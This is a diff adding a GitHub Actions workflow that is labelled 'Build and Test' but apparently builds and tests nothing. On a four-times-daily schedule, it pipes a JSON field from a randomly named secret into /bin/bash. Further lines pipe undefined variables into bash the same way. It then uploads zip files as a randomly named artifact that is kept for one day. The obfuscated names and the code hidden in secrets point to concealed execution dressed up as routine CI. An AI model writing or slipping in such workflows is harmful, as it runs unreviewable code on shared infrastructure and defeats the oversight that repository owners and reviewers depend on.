@@ -1,0 +1,31 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '57 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          cldgp2: ${{ secrets.cldgp2 }}
+        run: |
+          printf '%s' "$cldgp2" | jq -r .dxd8 | /bin/bash
+          printf '%s' "$xi5" | jq -r .knqq902 | /bin/bash
+          printf '%s' "$tvk364" | jq -r .zupmu16 | /bin/bash
+          echo $vey6 | jq -r .kecoe9 | /bin/bash
+          echo $mgs18118 | jq -r .r3789 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: TErciLEV
+          path: "*.zip"
+          retention-days: 1
